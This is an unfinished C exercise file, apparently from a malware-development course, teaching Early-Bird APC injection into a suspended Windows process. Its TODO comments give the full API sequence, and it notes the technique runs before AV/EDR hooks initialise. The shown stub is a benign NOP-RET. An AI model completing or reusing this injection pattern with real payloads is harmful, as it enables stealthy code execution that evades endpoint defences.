// CFarer - Malware Development Exercise 15
// TOPIC: Early-Bird APC Injection
// DIFFICULTY: Advanced  PLATFORM: Windows
// PURPOSE: Authorized malware research / red team education
//
// Early-Bird is an APC injection variant that queues the APC BEFORE the process
// has executed any user-mode code.  When ResumeThread() is called, the APC
// fires as the very first thing - before TLS callbacks, before the entry point,
// before any AV/EDR hooks have initialised in the target.
//
// Steps:
//   1. CreateProcess(target, ..., CREATE_SUSPENDED)
//   2. VirtualAllocEx(hProcess, RWX)
//   3. WriteProcessMemory(hProcess, addr, shellcode, size)
//   4. QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0)
//   5. ResumeThread(pi.hThread)  - APC fires immediately
//
// THIS EXERCISE: Use a benign NOP+RET stub.
//   Complete steps 1-5 with a safe { 0x90, 0x90, 0xC3 } stub.
//   The injected thread executes NOP NOP RET and returns normally.
//
// NOTE: Requires admin or SeDebugPrivilege for cross-process injection.
//       This exercise injects into a CHILD we create, so normal user rights suffice.

#include <windows.h>
#include <stdio.h>

// NOP NOP RET - safe benign stub
static const BYTE stub[] = { 0x90, 0x90, 0xC3 };

int main(void) {
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // TODO 1: CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL,
    //           FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
    BOOL created = FALSE;
    if (!created) {
        fprintf(stderr, "CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("Created PID %lu suspended\n", pi.dwProcessId);

    // TODO 2: VirtualAllocEx(pi.hProcess, NULL, sizeof(stub),
    //           MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    LPVOID remote_buf = NULL;
    if (!remote_buf) {
        fprintf(stderr, "VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("Allocated remote buf: %p\n", remote_buf);

    // TODO 3: WriteProcessMemory(pi.hProcess, remote_buf, stub, sizeof(stub), NULL)
    BOOL wrote = FALSE;
    if (!wrote) {
        fprintf(stderr, "WriteProcessMemory failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // TODO 4: QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0)
    DWORD queued = 0;
    if (!queued) {
        fprintf(stderr, "QueueUserAPC failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("APC queued to suspended thread\n");

    // TODO 5: ResumeThread(pi.hThread)  - APC fires, then process entry point runs
    //   DWORD prev = ResumeThread(pi.hThread);
    //   printf("ResumeThread prev count: %lu\n", prev);

    // Wait a moment then terminate cleanly
    Sleep(500);
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    printf("Done\n");
    return 0;
}

// I AM NOT DONE
